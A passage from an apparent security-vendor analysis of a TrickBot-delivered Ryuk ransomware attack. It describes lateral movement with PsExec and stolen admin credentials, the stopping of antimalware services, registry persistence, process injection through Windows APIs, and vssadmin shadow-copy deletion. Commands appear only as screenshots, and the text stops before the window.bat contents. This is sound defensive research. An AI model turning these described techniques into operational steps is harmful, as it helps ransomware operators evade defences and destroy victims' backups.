<p style="text-align: center;">&nbsp;<em>mimikatz strings in the spreader_x64.dll library.</em></p>
<h2 style="line-height: 1.75;">Phase Three: Post-exploitation Activity</h2>
<p>Once the machine is infected with TrickBot, the attackers check to see if the target machine is part of an industry they are looking to target. If it is, they download an additional payload and use the admin credentials stolen using TrickBot to perform lateral movement and reach the assets they wish to infect.&nbsp;</p>
<p>The attacker logged into a domain controller and copied tools into a temporary directory. It copied tools like AdFind.exe (the Active Directory enumeration utility), a bat script that uses AdFind to save output into text files, and a copy of the 7-Zip archive utility.&nbsp;</p>
<p>After the attacker gathers a list of domain controllers and targeted servers in the environment, they test if there is a connection available using ping.exe and mstsc.exe (RDP).&nbsp;</p>
<p>Once the attacker has a connection, they start to spread the Ryuk payload through the network via Windows administrative shares (<a href="https://attack.mitre.org/techniques/T1077/" rel=" noopener">MITRE ATT&amp;CK Technique T1077</a>). These are hidden shares like Admin$, IPC$, Share$ and C$ that are enabled by default on Windows hosts for administrative purposes.</p>
<p>&nbsp;The attacker drops a few files in the hidden share share$, including a .bat script COPY.bat. This script lists one or more of the targeted machines that the attacker located, a copy of psexec.exe that is signed and verified, and the Ryuk dropper Ryuk.exe. The attacker runs the .bat script, which uses the psexec.exe file with the stolen admin credentials to gain a remote shell and copy the malicious Ryuk payload to a temporary folder in the remote hosts listed in the text file comps{number}.txt.&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/x5jujIBUvPCvvMCa3XobHcITkpHdjv1dRqGwaUB-Fu5Q7GZ7MaTTT5EY6-pnRPXx8XP4k9mGLJxeQ9iKiLlAAHnqPLuZikfMwhsdZ_Fj8UPAo-oUrgo4LrPYU4FzE2WezmwZ9VSc" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-53.png?width=466&amp;name=triple-threat-blog-53.png" alt="triple-threat-blog-53" width="466" loading="lazy" style="width: 466px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-53.png?width=233&amp;name=triple-threat-blog-53.png 233w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-53.png?width=466&amp;name=triple-threat-blog-53.png 466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-53.png?width=699&amp;name=triple-threat-blog-53.png 699w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-53.png?width=932&amp;name=triple-threat-blog-53.png 932w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-53.png?width=1165&amp;name=triple-threat-blog-53.png 1165w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-53.png?width=1398&amp;name=triple-threat-blog-53.png 1398w" sizes="(max-width: 466px) 100vw, 466px"></em></p>
<p style="text-align: center;"><em>Execution of the .bat script as shown in the Cybereason Platform.</em></p>
<div><img src="https://lh3.googleusercontent.com/O8T_iZk9JSYDkZZ08IFvkLjX-nyD_ZtIT_P1hgC5z6DvpSKxSqhBw-mxzL4bKPGMVp-oykx47pIjmlv-VsiZQNHkbAWpT3Vby3KTu3oSoO14e8BsmHN4AVGWcqwWeiEIFNNXqC3j" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-54.png?width=429&amp;name=triple-threat-blog-54.png" alt="triple-threat-blog-54" width="429" loading="lazy" style="width: 429px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-54.png?width=215&amp;name=triple-threat-blog-54.png 215w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-54.png?width=429&amp;name=triple-threat-blog-54.png 429w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-54.png?width=644&amp;name=triple-threat-blog-54.png 644w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-54.png?width=858&amp;name=triple-threat-blog-54.png 858w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-54.png?width=1073&amp;name=triple-threat-blog-54.png 1073w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-54.png?width=1287&amp;name=triple-threat-blog-54.png 1287w" sizes="(max-width: 429px) 100vw, 429px"></em></p>
<p style="text-align: center;"><em>The PsExec command line.</em>&nbsp;</p>
<p>Once this is complete, the Ryuk payload is executed using PsExec.</p>
<p>&nbsp;<img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-55.png?width=1771&amp;name=triple-threat-blog-55.png" alt="triple-threat-blog-55" width="1771" loading="lazy" style="width: 1771px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-55.png?width=886&amp;name=triple-threat-blog-55.png 886w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-55.png?width=1771&amp;name=triple-threat-blog-55.png 1771w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-55.png?width=2657&amp;name=triple-threat-blog-55.png 2657w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-55.png?width=3542&amp;name=triple-threat-blog-55.png 3542w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-55.png?width=4428&amp;name=triple-threat-blog-55.png 4428w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-55.png?width=5313&amp;name=triple-threat-blog-55.png 5313w" sizes="(max-width: 1771px) 100vw, 1771px"></p>
<p style="text-align: center;"><em>The attack flow, beginning with the malicious email and ending with the Ryuk execution.</em>&nbsp;</p>
<h2 style="line-height: 1.75;">Ryuk Ransomware delivered</h2>
<p>The ransomware dropper Ryuk.exe checks the system architecture and drops its main payload accordingly.&nbsp;&nbsp;</p>
<div><img src="https://lh5.googleusercontent.com/vo1I5AsuBJ-OPs5NcCG5AuDBfm62bQaQuZiPp4B_Mt6yUhxHhklQMJ1qP9VqFnW7NBAmn1pA_UJwaRVrZ-mnGhvPzn5_asZcdpk9sYjfSCg-_QKpGoj-aXhqHfjIh8GEUN0HdEeZ" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-56.png?width=597&amp;name=triple-threat-blog-56.png" alt="triple-threat-blog-56" width="597" loading="lazy" style="width: 597px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-56.png?width=299&amp;name=triple-threat-blog-56.png 299w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-56.png?width=597&amp;name=triple-threat-blog-56.png 597w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-56.png?width=896&amp;name=triple-threat-blog-56.png 896w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-56.png?width=1194&amp;name=triple-threat-blog-56.png 1194w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-56.png?width=1493&amp;name=triple-threat-blog-56.png 1493w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-56.png?width=1791&amp;name=triple-threat-blog-56.png 1791w" sizes="(max-width: 597px) 100vw, 597px"></em></p>
<p style="text-align: center;"><em>The Ryuk ransomware analysis: checking the system architecture.</em></p>
<p>While dropping the payload, it generates a random name made up of five letters based on the <a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/srand?view=vs-2017" rel=" noopener">Srand</a><em>()</em> function. The payload is stored under this name in a location dependent on the OS version on the target machine. If the OS Version is XP or older, it writes a file at \<em>Documents and Settings\Default User\</em>. If the target machine is running a newer version, it writes a file at \Users\Public\.</p>
<div><img src="https://lh4.googleusercontent.com/0xAH2r_q_GRoBuokjc2yZ_xxmRYjAY5jQ62HUSQACaOzQrq3pj0rEdElvvOEzjRKMgKlmuQKIyI81oTlWekHb1J4m9rxzeVYlKz0IVW-QxXSqwifk4eU6Vmv4z8Zk_1CxLbnPtVw" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-57.png?width=1323&amp;name=triple-threat-blog-57.png" alt="triple-threat-blog-57" width="1323" loading="lazy" style="width: 1323px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-57.png?width=662&amp;name=triple-threat-blog-57.png 662w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-57.png?width=1323&amp;name=triple-threat-blog-57.png 1323w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-57.png?width=1985&amp;name=triple-threat-blog-57.png 1985w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-57.png?width=2646&amp;name=triple-threat-blog-57.png 2646w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-57.png?width=3308&amp;name=triple-threat-blog-57.png 3308w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-57.png?width=3969&amp;name=triple-threat-blog-57.png 3969w" sizes="(max-width: 1323px) 100vw, 1323px"></p>
<p style="text-align: center;"><em>The Ryuk ransomware analysis: choosing the target folder.</em></p>
<p>The dropper also stops multiple services related to antimalware products by using the net stop command:</p>
<div>&nbsp;<img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-58.png?width=1198&amp;name=triple-threat-blog-58.png" alt="triple-threat-blog-58" width="1198" loading="lazy" style="width: 1198px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-58.png?width=599&amp;name=triple-threat-blog-58.png 599w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-58.png?width=1198&amp;name=triple-threat-blog-58.png 1198w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-58.png?width=1797&amp;name=triple-threat-blog-58.png 1797w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-58.png?width=2396&amp;name=triple-threat-blog-58.png 2396w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-58.png?width=2995&amp;name=triple-threat-blog-58.png 2995w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-58.png?width=3594&amp;name=triple-threat-blog-58.png 3594w" sizes="(max-width: 1198px) 100vw, 1198px"></div>
<p style="text-align: center; font-size: 10px; line-height: 1;">&nbsp;</p>
<p style="text-align: center;"><em>The Ryuk ransomware analysis: net stop commands.</em></p>
<p>It kills multiple processes related to the antimalware product using the taskkill command&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/45XoBr68CBFgvFxQ3yq0Ljh-0YB5s4ovFxIn6vDCunNpy0NWxng4bj6XKEx8MPF7VpONeiUsjx5Yo-WlWGTHD38isiKxoaMlSLneFbERFqtdl4sGQJMppQWgMF0Gv1fAJGBFw1xi" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-59.png?width=420&amp;name=triple-threat-blog-59.png" alt="triple-threat-blog-59" width="420" loading="lazy" style="width: 420px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-59.png?width=210&amp;name=triple-threat-blog-59.png 210w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-59.png?width=420&amp;name=triple-threat-blog-59.png 420w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-59.png?width=630&amp;name=triple-threat-blog-59.png 630w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-59.png?width=840&amp;name=triple-threat-blog-59.png 840w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-59.png?width=1050&amp;name=triple-threat-blog-59.png 1050w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-59.png?width=1260&amp;name=triple-threat-blog-59.png 1260w" sizes="(max-width: 420px) 100vw, 420px"></em></p>
<p style="text-align: center;"><em>The Ryuk ransomware analysis: taskkill commands.</em>&nbsp;</p>
<p>The main Ryuk payload (<em>hszuw.exe, SHA1: d78c955173c447cb79fb559de122563d90d5358d</em>) is responsible for injecting into other processes and achieving persistence using the registry.&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/T57nUsGdVCNtTX_jOWfnWEp5YYDdGeHGpZlMpCsFbj09fjBudlIxWRBoIvKcpvVWYn8R7royh-wvQTlSuC8udCEGCSfyq4hK2xhPPyNFPfYDsTRjY0v6zpd9WaDZLxOb1QvXld9F" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-60.png?width=233&amp;name=triple-threat-blog-60.png" alt="triple-threat-blog-60" width="233" loading="lazy" style="width: 233px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-60.png?width=117&amp;name=triple-threat-blog-60.png 117w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-60.png?width=233&amp;name=triple-threat-blog-60.png 233w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-60.png?width=350&amp;name=triple-threat-blog-60.png 350w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-60.png?width=466&amp;name=triple-threat-blog-60.png 466w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-60.png?width=583&amp;name=triple-threat-blog-60.png 583w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-60.png?width=699&amp;name=triple-threat-blog-60.png 699w" sizes="(max-width: 233px) 100vw, 233px"></em></p>
<p style="text-align: center;"><em>The Ryuk payload creates persistence, shown in the Cybereason Platform. </em></p>
<p>&nbsp;The registry key is under the Run hive, and named svchos. It is responsible for running the Ryuk payload every time the current user logs on.&nbsp;</p>
<div><img src="https://lh5.googleusercontent.com/qz7ESAgb1mt8ZyQtu1kTXKkTeJuwnisCcShzqcMTN_TzJll0Ss0GVTcEpeXQhvbJr55YsY-724ZiSdFfGqm_W6anjOW6bYZeGEyRbYV1y1UItg4w2gC1h0XfT3IOguhl9cUClMFq" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-61.png?width=426&amp;name=triple-threat-blog-61.png" alt="triple-threat-blog-61" width="426" loading="lazy" style="width: 426px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-61.png?width=213&amp;name=triple-threat-blog-61.png 213w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-61.png?width=426&amp;name=triple-threat-blog-61.png 426w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-61.png?width=639&amp;name=triple-threat-blog-61.png 639w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-61.png?width=852&amp;name=triple-threat-blog-61.png 852w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-61.png?width=1065&amp;name=triple-threat-blog-61.png 1065w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-61.png?width=1278&amp;name=triple-threat-blog-61.png 1278w" sizes="(max-width: 426px) 100vw, 426px"></p>
<p style="text-align: center;"><em>Creation of the registry key.</em></p>
<p>The malware creates a snapshot of all running processes using <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-createtoolhelp32snapshot&amp;sa=D&amp;ust=1554143122749000">CreateToolhelp32Snapshot</a><em>()</em> and iterates over it using <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-process32first&amp;sa=D&amp;ust=1554143122749000">Process32First</a><em>()</em>and <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/tlhelp32/nf-tlhelp32-module32next&amp;sa=D&amp;ust=1554143122750000">Process32Next</a><em>()</em>.</p>
<p>The malware then compares the handle of the process to the handle of lsass.exe, csrss.exe, and explorer.exe. If the handle is not one of the above, the malware injects the malicious payload into the remote process.</p>
<div><img src="https://lh6.googleusercontent.com/HMvPJqVUjCfT4qzepAjMlLrKot39uhVUj7hgQRgDMrWk9Mm4Qjksy2uQAkdNw5zZR6wjYW4Yenjg5qpIo2tbHV9JfiSoIc6Zo17WyrJRVPKfqC7mI3yS6OVNo35jGbHNSZyJdnuJ" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-62.png?width=940&amp;name=triple-threat-blog-62.png" alt="triple-threat-blog-62" width="940" loading="lazy" style="width: 940px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-62.png?width=470&amp;name=triple-threat-blog-62.png 470w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-62.png?width=940&amp;name=triple-threat-blog-62.png 940w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-62.png?width=1410&amp;name=triple-threat-blog-62.png 1410w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-62.png?width=1880&amp;name=triple-threat-blog-62.png 1880w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-62.png?width=2350&amp;name=triple-threat-blog-62.png 2350w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-62.png?width=2820&amp;name=triple-threat-blog-62.png 2820w" sizes="(max-width: 940px) 100vw, 940px"></p>
<p style="text-align: center;"><em>The Ryuk ransomware analysis: checking the running processes.</em></p>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-63.png?width=1207&amp;name=triple-threat-blog-63.png" alt="triple-threat-blog-63" width="1207" loading="lazy" style="width: 1207px;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-63.png?width=604&amp;name=triple-threat-blog-63.png 604w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-63.png?width=1207&amp;name=triple-threat-blog-63.png 1207w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-63.png?width=1811&amp;name=triple-threat-blog-63.png 1811w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-63.png?width=2414&amp;name=triple-threat-blog-63.png 2414w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-63.png?width=3018&amp;name=triple-threat-blog-63.png 3018w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-63.png?width=3621&amp;name=triple-threat-blog-63.png 3621w" sizes="(max-width: 1207px) 100vw, 1207px"></em></p>
<div><img src="https://lh5.googleusercontent.com/aH8OaT88rtq58a6Ai9sLmTxTLyD3LcOzlVF-9gTpsCD3NH52Jy_5jfKmSX2lPtuPPDABHadCKggqWaqJUbZ4UDoogV9pBpv-e6sXFgkd39-WZU54YklcZWHOIdJy8dFo1qZkgT1t" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em>The Ryuk ransomware analysis: creating exceptions.</em></p>
<p>In this example, the payload was injected into several processes including taskhost.exe:&nbsp;</p>
<div><img src="https://lh6.googleusercontent.com/0gM9PbuyywVyLdc35mOLqAk_Cccfy1TwFqZavVSryvCa5G6Wb8BIVhBWtfP_Oln5nkYCme2pj-a_8goOnX7eRtSy4yHBupSs8dmtH_zXRweCWVfiCPPUYlOd3GMixvlt_QQrxhmc" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-64.png?width=560&amp;name=triple-threat-blog-64.png" alt="triple-threat-blog-64" width="560" loading="lazy" style="width: 560px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-64.png?width=280&amp;name=triple-threat-blog-64.png 280w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-64.png?width=560&amp;name=triple-threat-blog-64.png 560w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-64.png?width=840&amp;name=triple-threat-blog-64.png 840w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-64.png?width=1120&amp;name=triple-threat-blog-64.png 1120w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-64.png?width=1400&amp;name=triple-threat-blog-64.png 1400w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-64.png?width=1680&amp;name=triple-threat-blog-64.png 1680w" sizes="(max-width: 560px) 100vw, 560px"></em></p>
<p style="text-align: center;"><em>The Ryuk payload injects into the remote process taskhost.exe. </em></p>
<p style="text-align: center;"><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-65.png?width=975&amp;name=triple-threat-blog-65.png" alt="triple-threat-blog-65" width="975" loading="lazy" style="width: 975px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-65.png?width=488&amp;name=triple-threat-blog-65.png 488w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-65.png?width=975&amp;name=triple-threat-blog-65.png 975w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-65.png?width=1463&amp;name=triple-threat-blog-65.png 1463w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-65.png?width=1950&amp;name=triple-threat-blog-65.png 1950w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-65.png?width=2438&amp;name=triple-threat-blog-65.png 2438w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-65.png?width=2925&amp;name=triple-threat-blog-65.png 2925w" sizes="(max-width: 975px) 100vw, 975px"><img src="https://lh3.googleusercontent.com/6PjBv73VvOgBsfv5KelnT5QH2Y6RcaxrzFA4m7DL59RTL9gesWhSkVBN_Mq_b-LGnrR4IuR-KJWAMlhqpVJtOV1JjafnEAH-nZPIr6JF9IrB8pAYLcBIfNZdW3nprNW6-B1hwPhR" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>The floating PE in taskeng.exe.</em></p>
<p>Ryuk uses an injection technique, where it gets a handle of the target process using <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-openprocess&amp;sa=D&amp;ust=1554143122753000">OpenProcess</a><em>()</em>and allocates a buffer in its address space using <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-virtualallocex&amp;sa=D&amp;ust=1554143122753000">VirtualAllocEx</a><em>()</em>.</p>
<p>Ryuk writes its current virtual content into this process using <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/memoryapi/nf-memoryapi-writeprocessmemory&amp;sa=D&amp;ust=1554143122754000">WriteProcessMemory</a><em>()</em> and creates a remote thread that will execute code using <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows/desktop/api/processthreadsapi/nf-processthreadsapi-createremotethread&amp;sa=D&amp;ust=1554143122755000">CreateRemoteThread</a><em>()</em>.</p>
<div><img src="https://lh3.googleusercontent.com/Zc4l8V8CJ-FndyWJBUQT4OCuk229faxqaFIET5Q1epwLyv6TJuj2TGea5TxVXlIRf6ZRQQIZQdYXt44juhPq8wfnCFyFfE82yWlMP86NIg69Sbs4A6nLvdk_5YCOfLVwAvarLw9i" alt="" style="display: block; margin-left: auto; margin-right: auto;"></div>
<p style="text-align: center;"><em><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-66.png?width=1034&amp;name=triple-threat-blog-66.png" alt="triple-threat-blog-66" width="1034" loading="lazy" style="width: 1034px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-66.png?width=517&amp;name=triple-threat-blog-66.png 517w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-66.png?width=1034&amp;name=triple-threat-blog-66.png 1034w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-66.png?width=1551&amp;name=triple-threat-blog-66.png 1551w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-66.png?width=2068&amp;name=triple-threat-blog-66.png 2068w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-66.png?width=2585&amp;name=triple-threat-blog-66.png 2585w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-66.png?width=3102&amp;name=triple-threat-blog-66.png 3102w" sizes="(max-width: 1034px) 100vw, 1034px"></em></p>
<p style="text-align: center;"><em>Functions used for process injection in the Ruyuk binary.</em></p>
<p>The injected processes, in this case taskhost.exe, run a .bat file dropped by the malware, C:\users\Public\window.bat. This file contains multiple uses of <a href="https://www.google.com/url?q=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/vssadmin&amp;sa=D&amp;ust=1554143122756000">vssadmin</a> and deletes commands in order to change configuration and delete Virtual Shadow Copy. vssadmin.exe is a command-line tool that manages Volume Shadow Copy Service (VSS), which captures and copies stable images for backup on running systems.</p>
<p>Ransomware commonly uses vssadmin.exe to delete shadow copies and other backups of files before encrypting the files themselves. This ensures that the victim will be forced to pay to decrypt the valuable files when they can neither be decrypted or retrieved from VSS.</p>
<p><img src="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-67.png?width=724&amp;name=triple-threat-blog-67.png" alt="triple-threat-blog-67" width="724" loading="lazy" style="width: 724px; margin-left: auto; margin-right: auto; display: block;" srcset="https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-67.png?width=362&amp;name=triple-threat-blog-67.png 362w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-67.png?width=724&amp;name=triple-threat-blog-67.png 724w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-67.png?width=1086&amp;name=triple-threat-blog-67.png 1086w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-67.png?width=1448&amp;name=triple-threat-blog-67.png 1448w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-67.png?width=1810&amp;name=triple-threat-blog-67.png 1810w, https://www.cybereason.com/hs-fs/hubfs/dam/images/images-web/blog-images/triple-threat-blog-67.png?width=2172&amp;name=triple-threat-blog-67.png 2172w" sizes="(max-width: 724px) 100vw, 724px"><img src="https://lh3.googleusercontent.com/MO3bmfaA-dwMjj4W0nn-rGckYO0KinYMPvZU-1Cze5NkxSJzhORrUtd1I0h8NZ295fH2mi5-tJ5UC5ZlxNrCX04GNyQXt5HB0bSHEK_Hs-8fDv2G5_MvQ2wGi5olXuY1iYgpzDvy" alt="" style="display: block; margin-left: auto; margin-right: auto;"></p>
<p style="text-align: center;"><em>The window.bat script spawns vssadmin commands, as shown in the Cybereason Platform.</em></p>
<p>&nbsp;The contents of window.bat:</p>
